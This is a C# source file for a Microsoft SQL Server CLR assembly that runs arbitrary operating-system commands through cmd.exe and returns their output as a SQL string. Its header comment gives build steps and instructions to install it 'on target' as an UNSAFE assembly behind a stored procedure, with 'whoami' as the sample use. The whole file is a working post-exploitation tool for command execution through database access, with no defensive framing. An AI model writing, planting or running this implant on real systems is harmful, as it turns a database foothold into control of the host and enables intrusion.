/*
 * clr_cmd_exec — MSSQL CLR assembly for OS command execution.
 *
 * Exposes one SQL-callable method:
 *   CmdExec.Run(@cmd)  -> NVARCHAR(MAX) stdout of the command
 *
 * Compile:
 *     csc /target:library /out:clr_cmd_exec.dll clr_cmd_exec.cs
 *
 * Install on target (requires TRUSTWORTHY or EXTERNAL ACCESS):
 *     CREATE ASSEMBLY tk_clr FROM 0x<hex-bytes>
 *         WITH PERMISSION_SET = UNSAFE;
 *     CREATE PROCEDURE tk_cmd @cmd NVARCHAR(MAX)
 *         AS EXTERNAL NAME tk_clr.CmdExec.Run;
 *
 * Use:
 *     EXEC tk_cmd 'whoami';
 */

using System;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Text;
using Microsoft.SqlServer.Server;

public class CmdExec
{
    [SqlFunction(DataAccess = DataAccessKind.None,
                 IsDeterministic = false)]
    public static SqlString Run(SqlString cmd)
    {
        if (cmd.IsNull) return SqlString.Null;

        var psi = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c " + cmd.Value,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };

        try
        {
            using (var p = Process.Start(psi))
            {
                string stdout = p.StandardOutput.ReadToEnd();
                string stderr = p.StandardError.ReadToEnd();
                p.WaitForExit(15000);
                if (stderr.Length > 0)
                    stdout = stdout + stderr;
                return new SqlString(stdout);
            }
        }
        catch (Exception e)
        {
            return new SqlString("error: " + e.Message);
        }
    }
}